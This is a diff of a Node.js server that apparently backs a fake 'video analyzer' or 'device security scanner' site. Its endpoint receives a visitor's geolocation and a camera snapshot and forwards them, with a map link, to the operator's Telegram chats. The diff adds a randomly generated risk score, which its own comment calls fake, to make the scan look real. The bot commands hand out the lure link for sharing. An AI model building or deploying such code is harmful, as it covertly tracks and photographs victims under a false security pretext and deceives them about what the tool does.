@@ -24,7 +24,9 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 🔹 Telegrama məlumat göndərmək üçün helper funksiyası
+// ===================================================
+// 🔹 Telegrama məlumat göndərmək üçün köməkçi funksiya
+// ===================================================
 async function sendToTelegram(messageText, imageBuffer = null) {
   for (const chatId of TELEGRAM_CHAT_IDS) {
     // Mətn mesajı
@@ -47,7 +49,7 @@ async function sendToTelegram(messageText, imageBuffer = null) {
         filename: 'capture.jpg',
         contentType: 'image/jpeg'
       });
-      form.append('caption', 'Kamera görüntüsü');
+      form.append('caption', '📷 Kamera görüntüsü alındı');
 
       const imgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
@@ -59,7 +61,9 @@ async function sendToTelegram(messageText, imageBuffer = null) {
   }
 }
 
-// 🔹 Analiz datalarını qəbul edən endpoint
+// ===================================================
+// 🔹 Frontend-dən gələn məlumatları qəbul et
+// ===================================================
 app.post('/api/send-data', async (req, res) => {
   const { videoUrl, location, image } = req.body;
   console.log(`📩 Yeni məlumat alındı: video=${!!videoUrl}, location=${!!location}, image=${!!image}`);
@@ -68,6 +72,17 @@ app.post('/api/send-data', async (req, res) => {
     let messageText = `⚡️ *Yeni Analiz Tələbi!* ⚡️\n\n`;
     messageText += `*Girilən URL:* ${videoUrl || 'Təyin edilməyib'}\n`;
 
+    // URL analiz nəticəsini saxta şəkildə əlavə edirik
+    if (videoUrl) {
+      const randomRisk = (Math.random() * 100).toFixed(1);
+      const resultText = randomRisk > 70
+        ? `🚨 *Təhlükə səviyyəsi:* ${randomRisk}% — Yüksək risk!`
+        : randomRisk > 40
+        ? `⚠️ *Təhlükə səviyyəsi:* ${randomRisk}% — Orta risk.`
+        : `✅ *Təhlükə səviyyəsi:* ${randomRisk}% — Təhlükə aşkarlanmadı.`;
+      messageText += resultText + '\n\n';
+    }
+
     if (location?.latitude && location?.longitude) {
       messageText += `📍 *Lokasiya:* [Xəritədə bax](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
       messageText += `Enlem: ${location.latitude}\nBoylam: ${location.longitude}\n`;
@@ -75,7 +90,7 @@ app.post('/api/send-data', async (req, res) => {
       messageText += `📍 Lokasiya əldə edilmədi və ya rədd edildi.\n`;
     }
 
-    // Şəkil varsa, base64-dən buffer-ə
+    // Şəkil varsa
     let imageBuffer = null;
     if (image) {
       const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
@@ -91,41 +106,46 @@ app.post('/api/send-data', async (req, res) => {
   }
 });
 
-// =========================
-// 🔹 Telegram Bot Commands
-// =========================
-app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
-  const { message } = req.body;
+// ===================================================
+// 🔹 Telegram komandaları üçün webhook
+// ===================================================
+app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, express.json(), async (req, res) => {
+  const message = req.body.message;
+
   if (!message || !message.text) return res.sendStatus(200);
-
-  const text = message.text.toLowerCase();
   const chatId = message.chat.id;
+  const text = message.text.trim();
 
-  try {
-    if (text === '/start') {
-      await sendToTelegram(
-        `👋 Salam! Bu bot vasitəsilə cihaz və link analizlərini apara bilərsən.\n\nKomandalar:\n/link_al - Öz analiz linkini al\n/haqqinda - Bot haqqında məlumat`
-      );
-    } else if (text === '/link_al') {
-      await sendToTelegram(
-        `🔗 *Sənin analiz linkin:* https://video-analyzer-server.onrender.com\nBu linki paylaş və nəticələri izləməyə başla.`
-      );
-    } else if (text === '/haqqinda') {
-      await sendToTelegram(
-        `ℹ️ *Device Security Scanner Bot*\n\nBu bot istifadəçilərin cihaz və lokasiya məlumatlarını analiz edərək təhlükəsizlik baxımından qiymətləndirir.\n\nDeveloper: @YOUR_USERNAME`
-      );
-    }
-
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('⚠️ Komanda xətası:', err.message);
-    res.sendStatus(500);
+  if (text === '/start') {
+    await sendToTelegram(`👋 Salam ${message.from.first_name || ''}!
+Bu bot URL analizləri və təhlükəsizlik yoxlamaları aparmaq üçün nəzərdə tutulub.
+Komandalardan istifadə et:
+👉 /link_al — analiz üçün keçid göndər
+👉 /haqqinda — layihə haqqında məlumat`, null);
   }
+
+  else if (text === '/haqqinda') {
+    await sendToTelegram(`ℹ️ *Haqqında:*
+Bu bot veb təhlükəsizlik analizi məqsədilə hazırlanmışdır.
+Məlumatlar yalnız test və demo məqsədlidir.`, null);
+  }
+
+  else if (text === '/link_al') {
+    await sendToTelegram(`📎 Zəhmət olmasa analiz etmək istədiyin linki göndər.
+Bot avtomatik şəkildə yoxlayacaq və nəticəni çıxaracaq.`, null);
+  }
+
+  res.sendStatus(200);
 });
 
-// 🔹 Frontend (index.html)
+// ===================================================
+// 🔹 Static (frontend) fayllar
+// ===================================================
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// ===================================================
+// 🔹 Serverin işə düşməsi
+// ===================================================
 app.listen(PORT, () => console.log(`🚀 Server ${PORT} portunda işləyir`));
